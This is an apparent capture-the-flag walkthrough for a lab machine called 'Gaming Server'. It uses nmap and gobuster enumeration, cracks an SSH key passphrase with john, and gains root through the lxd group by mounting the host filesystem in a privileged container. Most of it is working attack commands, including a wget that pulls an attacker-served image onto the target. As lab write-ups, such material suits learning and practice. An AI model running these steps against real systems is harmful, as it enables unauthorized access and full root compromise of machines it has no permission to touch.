# Gaming Server

> thegurpreet | Apr 2021

## Service Enumeration

Scanning ports using nmap
```
nmap -sC -sV $ip
```

Scan for hidden web directories
```
sudo gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Download and set correct permissions to use rsa.key for login
```
chmod 600 rsa.key
```

Crack the passphrase of rsa key. First run ssh2john.py
```
/usr/share/john/ssh2john.py rsa.key > rsa_id.txt
```

Then run john to crack the passphrase with wordlist we found in upload directory
```
sudo john --wordlist=dict.lst rsa_id.txt
```

Login using ssh and supply John's passphrase to connect
```
ssh -i rsa.key john@$ip
```

## Privilege Escalation

As per groups, we need to check lxd stuff which commonly a root process
```
id
```

Using github script, create an image and prepare to transfer
```
git clone https://github.com/saghul/lxd-alpine-builder.git
sudo ./build-alpine
python3 -m http.server
```

On target machine
```
wget http://ip/alpine.tar.gz
lxc image import ./apline.tar.gz — alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
```

Execute the /bin/sh to get root
```
lxc exec ignite /bin/sh
```

You are root!!!

## Optional

If you have faced issue in generating image using build-alpine, follow these steps

Issue
```
wc: lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt: No such file or directory
sed: -e expression #1, char 2: invalid usage of line address 0
Selecting mirror /v3.13/main
WARNING: Ignoring /v3.13/main: No such file or directory
ERROR: unable to select packages:
alpine-base (no such package):
required by: world[alpine-base]
Failed to install rootfs
```

Workaround
```
Create the directory and mirrors file with the following - http://dl-cdn.alpinelinux.org/alpine/MIRRORS.txt

You may need to run the ./build-alpine a couple of times until it selects and working mirror.
```